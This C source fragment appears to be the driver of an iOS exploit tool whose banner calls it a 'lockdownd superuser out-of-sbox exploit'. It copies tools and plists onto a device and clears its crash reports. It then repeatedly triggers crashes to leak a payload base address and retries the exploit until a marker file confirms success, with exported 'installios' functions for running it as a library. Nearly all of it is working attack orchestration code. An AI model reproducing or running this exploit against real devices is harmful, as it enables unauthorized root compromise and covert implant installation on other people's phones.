#pragma mark -

void setupRes()
{
  gJBresources.res_list = gJbRes;
  gJBresources.res_name = gJbResName;
  gJBresources.res_len  = gJbRes_len;
  
  gJBresources.res_len[0] = res_com_apple_bootpd_plist_len;
  gJBresources.res_len[1] = res_dml_len;
  gJBresources.res_len[2] = res_kpb_dylib_len;
  gJBresources.res_len[3] = res_kpf_dylib_len;
  gJBresources.res_len[4] = res_launchd_conf_len;
  gJBresources.res_len[5] = res_Services_plist_len;
  gJBresources.res_len[6] = 0;
}

#ifdef NODYLIB

// Use Makefile to build exec tool
int main(int argc, char **argv)
{
  int i;
  
  _eprintf("\n   *0* kLock: lockdownd superuser out-of-sbox exploit *0*\n\n"
           "       By Ki0doPluz\n\n");
  if (argc == 3)
    sscanf(argv[2], "%x", &payload_base);
  
  if (argc > 1 && (strcmp(argv[1], "-i") == 0))
    start_ios();
  
  if (argc > 1 && (strcmp(argv[1], "-o") == 0))
    stop_ios();
  
  if (argc > 1 && (strcmp(argv[1], "-b") == 0))
    start_bootpd();
  
  if (argc > 1 && (strcmp(argv[1], "-t") == 0))
    stop_bootpd();
  
  if (argc > 1 && (strcmp(argv[1], "-c") == 0))
    start_crashmover();
  
  if (argc > 1 && (strcmp(argv[1], "-e") == 0))
  {
    exploiting(TRY_TOEXPL);
    return 0;
  }
  
  _eprintf("copying tools...\n");
  
  setupRes();
  
  createRemoteFoldersAndTools(&gJBresources, NULL);
  
  if (argc > 1 && strcmp(argv[1], "-l") == 0)
  {
    for(i=0;i<256;i++)
    {
      gRegValHit[i]=0;
      gRegVal[i]=-1;
    }
    
    _eprintf("cleanup remote crashreport folder...\n");
    
    cleanUpCrashReportFolder();
    
    _eprintf("leaking out payload base address...\n\n");
    
    for (i=0; i<3; i++)
    {
      _eprintf("try to leak attempt no. %d\n", i);
      exploiting(TRY_TOLEAK);
      sleep(8);
    }
    
    payload_base = getLeakedBaseAddress();
    
    _eprintf("\nok... try to exploiting with [0x%.8x]\n", payload_base);
    
    int expl_run = 0;
    int iter = 0;
    int curr_base = 0;
    
    while(expl_run == 0)
    {
      if (iter++ > 3 && curr_base < 256 && gRegVal[curr_base] != 0 )
      {
        payload_base = gRegVal[curr_base++];
        iter = 0;
      }
      
      exploiting(TRY_TOEXPL);
      sleep(5);
      expl_run = kjb_check_file("/kdi/c1", 2);
      
      if (iter>5)
      {
        _eprintf("exploiting failed.\n");
        return 0;
      }
    }
    
    _eprintf("exploiting done.\n");
    
    start_ios();
  }
  
  return 0;
}

#else

int __attribute__ ((visibility ("default"))) installios(char *iosfolder)
{
  int i;
  
  setupRes();
  
  createRemoteFoldersAndTools(&gJBresources, iosfolder);
  
  for(i=0;i<256;i++)
  {
    gRegValHit[i]=0;
    gRegVal[i]=-1;
  }
  
  cleanUpCrashReportFolder();
  
  for (i=0; i<3; i++)
  {
    exploiting(TRY_TOLEAK);
    sleep(8);
  }
  
  payload_base = getLeakedBaseAddress();
  
  int iter = 0;
  int expl_run = 0;
  int curr_base = 0;
  
  while(expl_run == 0)
  {
    if (iter++ > 3 && curr_base < 256 && gRegVal[curr_base] != 0 )
    {
      payload_base = gRegVal[curr_base++];
      iter = 0;
    }
    
    exploiting(TRY_TOEXPL);
    
    sleep(5);
    
    expl_run = kjb_check_file("/kdi/c1", 2);
    
    if (iter>5)
    {
      return 0;
    }
  }
  
  start_ios();
  
  return 1;
}

int __attribute__ ((visibility ("default"))) installios1(char *iosfolder)
{
  int i, ret = 0;
  
  setupRes();
  
  ret = createRemoteFoldersAndTools(&gJBresources, iosfolder);
  
  for(i=0;i<256;i++)
  {
    gRegValHit[i]=0;
    gRegVal[i]=-1;
  }
  
  cleanUpCrashReportFolder();
  
  return ret;
}

int __attribute__ ((visibility ("default"))) installios2(char *iosfolder)
{
  int i = 0;
  
  for (i=0; i<3; i++)
  {
    exploiting(TRY_TOLEAK);
    sleep(8);
  }
  
  payload_base = getLeakedBaseAddress();
  
  return 1;
}

int __attribute__ ((visibility ("default"))) installios3(char *iosfolder)
{
  int iter = 0;
  int expl_run = 0;
  int curr_base = 0;
  
  while(expl_run == 0)
  {
    if (iter++ > 3 && curr_base < 256 && gRegVal[curr_base] != 0 )
    {
      payload_base = gRegVal[curr_base++];
      iter = 0;
    }
    
    exploiting(TRY_TOEXPL);
    
    sleep(5);
    
    expl_run = kjb_check_file("/kdi/c1", 2);
    
    if (iter>5)
    {
      return 0;
    }
  }
  
  start_ios();
  
  return 1;
}

#endif
